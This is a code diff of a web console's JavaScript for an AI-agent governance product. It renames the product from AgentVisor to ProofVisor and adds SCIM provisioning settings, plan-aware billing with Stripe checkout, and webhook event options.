         '<td style="color:var(--fg-2)">' + timeAgoCell(k.lastUsedAt) + "</td>" +
         '<td style="color:var(--fg-2)">' + timeAgoCell(k.createdAt) + "</td>" +
         '<td>' +
@@ -5071,7 +5594,7 @@
           '<button class="btn accent" id="createKeyBtn" style="margin-left:auto">+ Create key</button>' +
         "</div>" +
         '<div class="table-wrap"><table>' +
-          "<thead><tr><th>Name</th><th>Prefix</th><th>Last used</th><th>Created</th><th class=\"act-2\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
+          "<thead><tr><th>Name</th><th>Prefix</th><th>Role</th><th>Last used</th><th>Created</th><th class=\"act-2\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
           "<tbody>" + rows + "</tbody>" +
         "</table></div>" +
       "</div>";
@@ -5225,7 +5748,9 @@
         '<div style="padding: 20px 16px">' + mfaRows + '</div>' +
       '</div>';
 
-    root.innerHTML = oauthCard + samlCard + mfaCard;
+    root.innerHTML = oauthCard + samlCard + mfaCard + '<div id="scimCard"></div>';
+    var ssoRole = (state.session && state.session.org && state.session.org.role) || "member";
+    if (ssoRole === "owner" && typeof state.ds.getScimSettings === "function") renderScimCard($("#scimCard", root));
 
     var addBtn = $("#addSamlBtn", root);
     if (addBtn) addBtn.addEventListener("click", function () { openSamlEditor(root, null); });
@@ -5267,7 +5792,7 @@
           title: "Revoke passkey?",
           // R125 F1: R124 F1 turned DELETE /credentials/:id into a
           // session-wide fence (sessionRevokedAt bumped + all
-          // av_srv_ tokens the user created revoked). The prior
+          // pv_srv_ tokens the user created revoked). The prior
           // body copy neglected both side-effects. Warn the user
           // explicitly so a legitimate rotation ("swap yubikeys")
           // isn't a surprise CI-tokens-broken incident.
@@ -5300,7 +5825,7 @@
                   stopLiveStream();
                   rolePreview = null;
                   state.session = null;
-                  try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+                  try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
                   toast("Passkey revoked. Sign in again to continue.");
                   navigate("#/login");
                 }).catch(function (err) { toast(err.message || "Revoke failed", true); });
@@ -5335,6 +5860,80 @@
           },
         });
       }
+    });
+  }
+
+  // ---------- SCIM provisioning card (owner only) ----------
+  async function renderScimCard(host) {
+    if (!host) return;
+    host.innerHTML = '<div class="card">' + loadingBlock("table") + "</div>";
+    var settings, tokens;
+    try {
+      settings = await state.ds.getScimSettings();
+      tokens = await state.ds.listScimTokens();
+    } catch (e) {
+      host.innerHTML = '<div class="card empty"><h3>Could not load SCIM</h3><p>' + esc((e && e.message) || "Try again in a moment.") + "</p></div>";
+      return;
+    }
+    var rows = (tokens || []).map(function (t) {
+      return '<tr data-id="' + esc(t.id) + '"><td>' + esc(t.name) + '<div class="id">' + esc(t.hint) + "</div></td>" +
+        "<td>" + esc(t.lastUsedAt ? new Date(t.lastUsedAt).toLocaleString() : "never") + "</td>" +
+        '<td class="actions"><button class="btn danger" data-revoke="' + esc(t.id) + '">Revoke</button></td></tr>';
+    }).join("");
+    host.innerHTML = '<div class="card" id="scimPanel">' +
+      "<h2>SCIM provisioning</h2>" +
+      '<p style="color: var(--fg-2); font-size: var(--t-sec); margin: 0 0 12px">Let your identity provider (Okta, Entra ID, Google) create, update and remove members automatically. ' +
+        "Groups named owner, admin or member set the member's role.</p>" +
+      (settings.planAllows ? "" : '<p class="notice" role="status">SCIM is not included in your plan. Upgrade on the Billing tab to enable it.</p>') +
+      '<div class="spec-grid">' +
+        '<div class="field"><label><input type="checkbox" id="scimEnabled"' + (settings.enabled ? " checked" : "") + (settings.planAllows ? "" : " disabled") + "> Enable SCIM</label></div>" +
+        '<div class="field"><label for="scimRole">Default role for new users</label><select id="scimRole">' +
+          ["member", "admin"].map(function (r) { return '<option value="' + r + '"' + (settings.defaultRole === r ? " selected" : "") + ">" + r + "</option>"; }).join("") +
+        "</select></div>" +
+        '<div class="field"><label for="scimDeprov">When a user is deactivated in the IdP</label><select id="scimDeprov">' +
+          '<option value="deactivate"' + (settings.deprovisionAction === "deactivate" ? " selected" : "") + ">Suspend access (keep the member record)</option>" +
+          '<option value="remove"' + (settings.deprovisionAction === "remove" ? " selected" : "") + ">Remove the member</option>" +
+        "</select></div>" +
+      "</div>" +
+      '<div class="field"><label>SCIM base URL</label><div class="copy-row"><code>' + esc(settings.baseUrl) + '</code> <button class="btn" type="button" id="scimCopyUrl">Copy</button></div></div>' +
+      '<div style="display:flex; align-items:center; gap:8px; margin: 12px 0 8px"><h3 style="margin:0">Tokens</h3>' +
+        '<button class="btn accent" id="scimNewToken" style="margin-left:auto"' + (settings.planAllows ? "" : " disabled") + ">New token</button></div>" +
+      (rows ? '<table><thead><tr><th>Name</th><th>Last used</th><th class="sr-only">Actions</th></tr></thead><tbody>' + rows + "</tbody></table>"
+        : '<p style="color: var(--fg-3); font-size: var(--t-sec)">No tokens yet. Create one and paste it into your identity provider.</p>') +
+    "</div>";
+    function save(fields) {
+      state.ds.updateScimSettings(fields).then(function () { toast("SCIM settings saved"); renderScimCard(host); })
+        .catch(function (err) { toast((err && err.data && err.data.detail) || (err && err.message) || "Save failed", true); renderScimCard(host); });
+    }
+    $("#scimEnabled", host).addEventListener("change", function (e) { save({ enabled: e.target.checked }); });
+    $("#scimRole", host).addEventListener("change", function (e) { save({ defaultRole: e.target.value }); });
+    $("#scimDeprov", host).addEventListener("change", function (e) { save({ deprovisionAction: e.target.value }); });
+    $("#scimCopyUrl", host).addEventListener("click", function () { copyText(settings.baseUrl); });
+    $("#scimNewToken", host).addEventListener("click", function () {
+      var name = window.prompt("Name this token (for example the identity provider it is for):", "Okta");
+      if (!name || !name.trim()) return;
+      state.ds.createScimToken(name.trim()).then(function (r) {
+        confirmModal({
+          title: "SCIM token created",
+          body: "Copy it now and paste it into your identity provider as the bearer token. It is shown only once.\n\n" + r.plaintextToken,
+          confirmLabel: "Done",
+          onConfirm: function () { renderScimCard(host); },
+        });
+      }).catch(function (err) { toast((err && err.data && err.data.detail) || (err && err.message) || "Could not create the token", true); });
+    });
+    $$("[data-revoke]", host).forEach(function (btn) {
+      btn.addEventListener("click", function () {
+        var id = btn.getAttribute("data-revoke");
+        confirmModal({
+          title: "Revoke this SCIM token?",
+          body: "Your identity provider stops provisioning with it immediately.",
+          confirmLabel: "Revoke", danger: true,
+          onConfirm: function () {
+            state.ds.revokeScimToken(id).then(function () { toast("Token revoked"); renderScimCard(host); })
+              .catch(function (err) { toast((err && err.message) || "Revoke failed", true); });
+          },
+        });
+      });
     });
   }
 
@@ -5603,8 +6202,8 @@
           '<p class="sub">Paste values from your Okta / Auth0 / Entra / SAML IdP admin console.</p>' +
           '<form id="samlForm">' +
             '<div class="field"><label for="s_name">Display name</label><input id="s_name" required maxlength="80" placeholder="Okta production" value="' + esc(c.displayName) + '"></div>' +
-            '<div class="field"><label for="s_ssoUrl">IdP SSO URL</label><input id="s_ssoUrl" required type="url" placeholder="https://acme.okta.com/app/agentvisor/sso/saml" value="' + esc(c.ssoUrl) + '"></div>' +
-            '<div class="field"><label for="s_sloUrl">IdP SLO URL (optional)</label><input id="s_sloUrl" type="url" placeholder="https://acme.okta.com/app/agentvisor/slo/saml" value="' + esc(c.sloUrl || "") + '"></div>' +
+            '<div class="field"><label for="s_ssoUrl">IdP SSO URL</label><input id="s_ssoUrl" required type="url" placeholder="https://acme.okta.com/app/proofvisor/sso/saml" value="' + esc(c.ssoUrl) + '"></div>' +
+            '<div class="field"><label for="s_sloUrl">IdP SLO URL (optional)</label><input id="s_sloUrl" type="url" placeholder="https://acme.okta.com/app/proofvisor/slo/saml" value="' + esc(c.sloUrl || "") + '"></div>' +
             '<div class="field"><label for="s_entityIdIdp">IdP Entity ID</label><input id="s_entityIdIdp" required placeholder="http://www.okta.com/exkABCDE" value="' + esc(c.entityIdIdp) + '"></div>' +
             '<div class="field"><label for="s_x509">IdP X.509 Certificate (PEM)</label><textarea id="s_x509" required rows="6" style="font-family: SF Mono, ui-monospace, monospace; font-size:11.5px" placeholder="-----BEGIN CERTIFICATE-----&#10;MIIDpDCC...&#10;-----END CERTIFICATE-----">' + esc(c.x509Cert) + '</textarea></div>' +
             '<div style="display:grid; grid-template-columns:1fr 1fr; gap:12px">' +
@@ -5711,16 +6310,15 @@
 
     function openAddModal() {
       if (document.body.classList.contains("locked")) return;
-      // R230 F1: server-side dispatchEvent() only fires 3 event
-      // names — policy.block (ingest.ts), member.invited (members.ts),
-      // and the endpoint-scoped smoketest 'test' (webhooks.ts). Prior
-      // shape offered apikey.created, apikey.revoked, and
-      // webhook.test_fired too — those are audit-only slugs
-      // (writeAudit event field) that never round-trip through the
-      // webhook fanout. A user subscribing to any of them silently
-      // received zero deliveries forever. Trim to what the server
-      // actually emits + the '*' wildcard.
-      var events = ["policy.block", "member.invited", "*"];
+      // Only event names the server's dispatchEvent() actually emits:
+      // policy.block and session.blocked (ingest.ts), member.invited
+      // (members.ts), apikey.created (api-keys.ts), plus the '*'
+      // wildcard. The endpoint-scoped smoke test 'test' is sent by the
+      // "Send test" button regardless of subscription. Audit-only slugs
+      // (apikey.revoked, webhook.test_fired, …) never round-trip through
+      // the fanout, so offering them here would subscribe people to
+      // silence (R230 F1).
+      var events = ["policy.block", "session.blocked", "member.invited", "apikey.created", "*"];
       var backdrop = h(
         '<div class="modal-backdrop" role="dialog" aria-modal="true">' +
           '<div class="modal">' +
@@ -5791,7 +6389,7 @@
           var res = await state.ds.createWebhook({ name: name, url: url, events: events });
           closeWh();
           showTokenModal(res.secret, "Webhook secret", {
-            subtitle: "Configure your receiver to validate every delivery with this HMAC signing secret. Compare against the X-AgentVisor-Signature header.",
+            subtitle: "Configure your receiver to validate every delivery with this HMAC signing secret. Compare against the X-ProofVisor-Signature header.",
             notice: "If you lose it, rotate to mint a new secret; deliveries signed with the old one will still verify against your receiver until you swap them.",
           });
           await renderSettingsWebhooks(root);
@@ -5810,7 +6408,7 @@
             '<span style="margin-left:8px; color:var(--fg-3); font-size:var(--t-sec)">0 endpoints</span>' +
           "</div>" +
           '<div style="padding: 24px 16px">' +
-          emptyState("No webhooks yet", "Wire AgentVisor to Slack / PagerDuty / Datadog / your own service. Payloads are HMAC-SHA256 signed.", "+ Add webhook", null, "whAdd") +
+          emptyState("No webhooks yet", "Wire ProofVisor to Slack / PagerDuty / Datadog / your own service. Payloads are HMAC-SHA256 signed.", "+ Add webhook", null, "whAdd") +
           "</div></div>";
       on($("#whAdd", root), "click", openAddModal);
       return;
@@ -6006,38 +6604,97 @@
   }
   async function renderSettingsBilling(root) {
     root.innerHTML = '<div class="card">' + loadingBlock("table") + "</div>";
-    // Pull the org's real usage so the pricing story runs on the same
-    // numbers the investor just saw on the Overview.
+    var billing = null;
     var stats = null;
+    try { billing = await state.ds.getBilling(); } catch (e) { billing = null; }
+    // Pull the org's real usage so the pricing math runs on the same
+    // numbers the Overview shows.
     try { stats = await state.ds.getOverview("24h"); } catch (e) { /* tiers still render */ }
-    var calls = stats ? (stats.toolsAllowed + stats.toolsBlocked) : 0;
+    // Coerced to numbers: a string count would otherwise concatenate
+    // ("3" + "4" = "34") and reach innerHTML unescaped.
+    var calls = stats ? (Number(stats.toolsAllowed) || 0) + (Number(stats.toolsBlocked) || 0) : 0;
     var meteredUsd = (calls / 1000) * 0.10;
-    var kept = stats ? Number(stats.blockedSpendUsd) : 0;
-    var tier = function (name, price, priceSub, items, cta, highlight) {
+    var kept = stats ? Number(stats.blockedSpendUsd) || 0 : 0;
+    var role = (state.session && state.session.org && state.session.org.role) || "member";
+    var isOwner = role === "owner";
+    var plan = billing ? billing.plan : "free";
+    var plans = (billing && billing.plans) || {};
+    var planName = { free: "Free", team: "Team", enterprise: "Enterprise" };
+    function limitText(n, unit) { return n == null ? "unlimited " + unit : n.toLocaleString() + " " + unit; }
+    function tierLimits(p) {
+      var l = plans[p];
+      if (!l || !billing || !billing.enforced) return null;
+      return [limitText(l.deployments, "deployments"), limitText(l.members, "members"),
+        l.retentionDays == null ? "Unlimited retention" : l.retentionDays + "-day retention"];
+    }
+    var tier = function (id, price, priceSub, items, cta, highlight) {
       return '<div class="price-tier' + (highlight ? " highlight" : "") + '">' +
-        '<h3>' + esc(name) + "</h3>" +
+        "<h3>" + esc(planName[id]) + "</h3>" +
         '<div class="pt-price">' + price + "</div>" +
         '<div class="pt-price-sub">' + esc(priceSub) + "</div>" +
         "<ul>" + items.map(function (i) { return "<li>" + esc(i) + "</li>"; }).join("") + "</ul>" +
         cta +
       "</div>";
     };
+    function ctaFor(id) {
+      if (id === plan) {
+        return billing && billing.hasSubscription && isOwner
+          ? '<button class="btn" id="portalBtn">Manage billing</button>'
+          : '<span class="pill ok">Current plan</span>';
+      }
+      if (id === "free") return "";
+      if (billing && billing.purchasable && billing.purchasable[id] && isOwner) {
+        return '<button class="btn' + (id === "team" ? " accent" : "") + '" data-checkout="' + id + '">Upgrade to ' + esc(planName[id]) + "</button>";
+      }
+      if (id === "enterprise") return '<a class="btn" href="mailto:hello@proofvisor.com?subject=ProofVisor%20Enterprise">Contact us</a>';
+      return billing && billing.configured && !isOwner
+        ? '<span class="pill neutral">Ask an owner to upgrade</span>'
+        : "";
+    }
+    function usageRow(label, used, cap) {
+      var u = Number(used) || 0;
+      var pct = cap == null ? 0 : Math.min(100, Math.round((u / Math.max(1, cap)) * 100));
+      return '<div class="usage-row"><div class="usage-label">' + esc(label) + '<span>' + esc(u.toLocaleString()) + " of " + esc(cap == null ? "unlimited" : Number(cap).toLocaleString()) + "</span></div>" +
+        '<div class="ob-bar"><span style="width:' + pct + '%"></span></div></div>';
+    }
+    var statusPill = !billing ? "" : billing.planStatus === "past_due"
+      ? '<span class="pill err">payment failed — update your card</span>'
+      : billing.planStatus === "canceled" ? '<span class="pill neutral">canceled</span>'
+      : billing.planStatus === "trialing" ? '<span class="pill accent">trial</span>'
+      : '<span class="pill accent">current plan</span>';
+    var planLine = !billing
+      ? "Billing details could not be loaded. Try again in a moment."
+      : !billing.configured
+      ? "Billing is not enabled on this instance, so every workspace has every feature and nothing is limited."
+      : !billing.enforced
+      ? "Plan limits are not enforced on this instance: every workspace has every feature."
+      : billing.planRenewsAt
+      ? "Renews on " + new Date(billing.planRenewsAt).toLocaleDateString() + "."
+      : "Limits below apply to new deployments, members and webhooks; nothing you already have is removed.";
+    var usageCard = billing && billing.enforced && billing.limits && billing.usage
+      ? '<div class="card" style="margin-top:12px"><h2>Usage on the ' + esc(planName[plan] || plan) + " plan</h2>" +
+          usageRow("Deployments", billing.usage.deployments, billing.limits.deployments) +
+          usageRow("Members and pending invites", billing.usage.members, billing.limits.members) +
+          usageRow("Webhooks", billing.usage.webhooks, billing.limits.webhooks) +
+        "</div>"
+      : "";
     root.innerHTML =
       '<div class="card">' +
         "<h2>Plan</h2>" +
-        '<div style="display:flex; align-items:baseline; gap:8px; margin-bottom: 12px"><span style="font-size:22px; font-weight:600">Free</span> <span class="pill accent">current plan</span></div>' +
-        '<p style="color: var(--fg-2); font-size: var(--t-sec); margin: 0">All governance features included while AgentVisor is in preview. Pricing below is what launches with the beta.</p>' +
+        '<div style="display:flex; align-items:baseline; gap:8px; margin-bottom: 12px"><span style="font-size:22px; font-weight:600">' + esc(planName[plan] || plan) + "</span> " + statusPill + "</div>" +
+        '<p style="color: var(--fg-2); font-size: var(--t-sec); margin: 0">' + esc(planLine) + "</p>" +
       "</div>" +
+      usageCard +
       '<div class="pricing-grid">' +
-        tier("Free", "$0", "up to 10 deployments",
-          ["Every governance feature", "Signed receipts + offline verify", "90-day retention", "Community support"],
-          '<span class="pill ok">You are here</span>') +
-        tier("Team", "$99<span class=\"pt-per\">/mo</span>", "+ $0.10 per 1,000 policed tool calls",
-          ["Everything in Free", "SSO enforcement + SCIM", "1-year retention", "Priority support"],
-          '<button class="btn accent" id="upgradeBtn">Upgrade to Team</button>', true) +
-        tier("Enterprise", "Custom", "annual, self-hosted or dedicated",
-          ["Self-hosted control plane", "Custom receipt trust anchors", "SLAs + dedicated support", "Airgapped verify tooling"],
-          '<button class="btn" id="contactBtn">Contact us</button>') +
+        tier("free", "$0", "for small teams getting started",
+          tierLimits("free") || ["Every governance feature", "Signed receipts + offline verify", "Community support"],
+          ctaFor("free")) +
+        tier("team", "$99<span class=\"pt-per\">/mo</span>", "+ $0.10 per 1,000 policed tool calls",
+          (tierLimits("team") || []).concat(["SAML single sign-on + SCIM provisioning", "Priority support"]),
+          ctaFor("team"), true) +
+        tier("enterprise", "Custom", "annual, self-hosted or dedicated",
+          ["Unlimited deployments and members", "Self-hosted control plane", "SLAs + dedicated support"],
+          ctaFor("enterprise")) +
       "</div>" +
       (stats
         ? '<div class="card" style="margin-top:12px">' +
@@ -6050,10 +6707,27 @@
             '<p style="color: var(--fg-2); font-size: var(--t-sec); margin: 12px 0 0">Policing an agent\'s tool call costs a fraction of a cent. One blocked bad order pays for years of it.</p>' +
           "</div>"
         : "");
-    var b = $("#upgradeBtn", root);
-    if (b) b.addEventListener("click", function () { comingSoon("Upgrade to Team", "Billing lands in the beta. In the meantime, ping the AgentVisor team to enable Team features on your workspace."); });
-    var c = $("#contactBtn", root);
-    if (c) c.addEventListener("click", function () { comingSoon("Enterprise", "Talk to us about a self-hosted control plane, custom trust anchors, and SLAs: hello@agentvisorai.me"); });
+    // Only an https Stripe page is followed: a malformed API answer
+    // must never turn into a javascript: or plain-http navigation.
+    function go(url) {
+      if (typeof url === "string" && /^https:\/\//.test(url)) location.assign(url);
+      else toast("The billing provider returned an unexpected link.", true);
+    }
+    function billingError(err) {
+      return (err && err.data && err.data.detail) || (err && err.message) || "Billing is unavailable right now.";
+    }
+    $$("[data-checkout]", root).forEach(function (btn) {
+      btn.addEventListener("click", function () {
+        btn.disabled = true;
+        state.ds.startCheckout(btn.getAttribute("data-checkout")).then(go).catch(function (err) { btn.disabled = false; toast(billingError(err), true); });
+      });
+    });
+    var portal = $("#portalBtn", root);
+    if (portal) portal.addEventListener("click", function () {
+      portal.disabled = true;
+      state.ds.openBillingPortal().then(go)
+        .catch(function (err) { portal.disabled = false; toast(billingError(err), true); });
+    });
   }
   async function renderSettingsAudit(root) {
     // R124 F2: if the user was bounced here from a failed
@@ -6218,7 +6892,7 @@
       var blob = new Blob(["\ufeff" + lines.join("\r\n")], { type: "text/csv;charset=utf-8" });
       var a2 = document.createElement("a");
       a2.href = URL.createObjectURL(blob);
-      a2.download = "agentvisor-audit-" + stamp + ".csv";
+      a2.download = "proofvisor-audit-" + stamp + ".csv";
       document.body.appendChild(a2); a2.click(); a2.remove();
       setTimeout(function () { URL.revokeObjectURL(a2.href); }, 4000);
       toast(list.length + " audit entr" + (list.length === 1 ? "y" : "ies") + " exported");
@@ -6333,7 +7007,7 @@
     });
     var actions = [
       { g: "Actions", label: "Toggle theme", desc: "Switch light / dark", run: function () { toggleTheme(); } },
-      { g: "Actions", label: "New deployment", desc: "Register an agentvisord daemon", run: function () { navigate("#/deployments"); setTimeout(openCreateDeploymentModal, 100); } },
+      { g: "Actions", label: "New deployment", desc: "Register an proofvisord daemon", run: function () { navigate("#/deployments"); setTimeout(openCreateDeploymentModal, 100); } },
       { g: "Actions", label: "Change password", desc: "Rotate your password; other sessions sign out", run: function () { navigate("#/settings/general"); setTimeout(changePasswordModal, 250); } },
       { g: "Actions", label: "Sign out", desc: "Leave this workspace", run: signOut },
     ];
@@ -6345,22 +7019,22 @@
       // launcher pill already hides in fresh mode; the palette follows
       // the same rule.
       var freshNow = freshT0() != null;
-      if (window.AVTour && !freshNow) actions.unshift({ g: "Actions", label: "See the full flow", desc: "Guided tour of the money story", run: function () { window.AVTour.start(); } });
+      if (window.PVTour && !freshNow) actions.unshift({ g: "Actions", label: "See the full flow", desc: "Guided tour of the money story", run: function () { window.PVTour.start(); } });
       if (typeof state.ds.simulateAttack === "function" && attackReady()) actions.push({ g: "Actions", label: "Simulate an agent attack", desc: "Stage a live blocked payment", run: function () { navigate("#/overview"); setTimeout(runAttackDemo, 250); } });
     }
-    actions.push({ g: "Actions", label: "New policy", desc: "Create a spend cap, vendor allowlist, or PII guard", run: function () { navigate("#/policies"); setTimeout(openCreatePolicyModal, 250); } });
+    actions.push({ g: "Actions", label: "New policy", desc: "Create a spend cap, tool allowlist, vendor schema, rate limit or PII guard", run: function () { navigate("#/policies"); setTimeout(openCreatePolicyModal, 250); } });
     actions.push({ g: "Actions", label: "Keyboard shortcuts", desc: "Everything the keyboard can do", kbd: "?", run: function () { setTimeout(openShortcutSheet, 250); } });
     if (state.ds.mode === "mock" && freshT0() == null) {
       // Hidden in fresh mode with the tour: fresh listSessions ignores
       // the bigdata flag entirely, so the entry would be a lying no-op.
       var big = false;
-      try { big = localStorage.getItem("av_mock_bigdata") === "1"; } catch (e) {}
+      try { big = localStorage.getItem("pv_mock_bigdata") === "1"; } catch (e) {}
       actions.push({
         g: "Actions",
         label: big ? "Back to the 24h dataset" : "Load the 30-day dataset (280 sessions)",
         desc: big ? "Return to the focused demo data" : "What the console looks like at scale — pagination, sort, exports",
         run: function () {
-          try { localStorage.setItem("av_mock_bigdata", big ? "0" : "1"); } catch (e) {}
+          try { localStorage.setItem("pv_mock_bigdata", big ? "0" : "1"); } catch (e) {}
           // navigate() renders (hashchange, or directly when the hash
           // is unchanged) — an extra render() here raced it with two
           // parallel renderSessionsList fetches clobbering each other.
@@ -6389,14 +7063,14 @@
     var pages = [
       { g: "Pages", label: "Verify a receipt", desc: "Public offline verifier — green tick, no account", run: function () { window.open("../verify/", "_blank", "noopener"); } },
       { g: "Pages", label: "Watch the pitch", desc: "30 s hero + 130 s full tour, with transcripts", run: function () { window.open("../pitch/", "_blank", "noopener"); } },
-      { g: "Pages", label: "Read the code", desc: "github.com/AgentVisorAI/agentvisor", run: function () { window.open("https://github.com/AgentVisorAI/agentvisor", "_blank", "noopener"); } },
+      { g: "Pages", label: "Read the code", desc: "github.com/ProofVisorAI/proofvisor", run: function () { window.open("https://github.com/ProofVisorAI/proofvisor", "_blank", "noopener"); } },
     ];
     if (state.ds.mode === "mock") {
       // Demo-table reset: judges hand the laptop around; this returns
       // the console to the pristine Northwind showcase in one action.
       pages.push({ g: "Pages", label: "Reset demo data", desc: "Back to the pristine showcase workspace", run: function () {
         try {
-          ["av_mock_fresh_t0", "av_mock_fresh_identity", "av_mock_signed_out", "av_tour_dismissed", "av_mock_bigdata"].forEach(function (k) { localStorage.removeItem(k); });
+          ["pv_mock_fresh_t0", "pv_mock_fresh_identity", "pv_mock_signed_out", "pv_tour_dismissed", "pv_mock_bigdata"].forEach(function (k) { localStorage.removeItem(k); });
         } catch (e) {}
         location.hash = "#/overview";
         location.reload();
@@ -6718,8 +7392,12 @@
         + (err && err.requestId ? " (request id: " + esc(err.requestId) + ")" : "");
     var actions = isNotFound
       ? '<a class="btn accent" href="#/sessions">Back to sessions</a> <a class="btn" href="#/overview">Overview</a>'
-      : '<button class="btn accent" onclick="location.reload()">Reload</button> <a class="btn" href="#/overview">Overview</a>';
+      : '<button class="btn accent" type="button" data-reload>Reload</button> <a class="btn" href="#/overview">Overview</a>';
     main.innerHTML = pageHeader(title) + '<div class="card"><div class="empty"><h3>' + esc(title) + "</h3><p>" + detail + "</p>" + actions + "</div></div>";
+    // A listener, not an inline onclick: the page CSP sets
+    // script-src-attr 'none', which silently blocks inline handlers.
+    var reload = main.querySelector("[data-reload]");
+    if (reload) reload.addEventListener("click", function () { location.reload(); });
   }
 
   /* ---------- go ---------- */
@@ -6741,6 +7419,6 @@
     // crash card stands down (post-boot errors are logged, not fatal)
     // and the blank-page watchdog is satisfied. Set only AFTER boot so
     // an exception mid-boot still shows the card.
-    window.__avBooted = true;
+    window.__pvBooted = true;
   });
 })();
